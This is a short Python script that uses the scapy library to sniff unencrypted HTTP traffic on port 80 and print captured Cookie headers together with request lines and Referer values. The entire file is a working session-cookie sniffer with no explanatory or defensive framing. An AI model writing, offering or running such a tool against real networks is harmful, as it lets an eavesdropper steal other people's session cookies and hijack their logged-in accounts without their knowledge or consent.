from scapy.all import *

def packet_callback(packet):
    if packet[TCP].payload:
        cookie_packet = bytes(packet[TCP].payload)
        if b"Cookie" in cookie_packet:
            for info in cookie_packet.split(b'\n'):
                if b'Referer' in info or b'GET /' in info or b'POST /' in info:
                    print(info)
                elif b'Cookie' in info:
                    print(info, "\n")


def main():
    sniff(filter="tcp port 80", prn=packet_callback, store=0)

if __name__ == '__main__':
    main()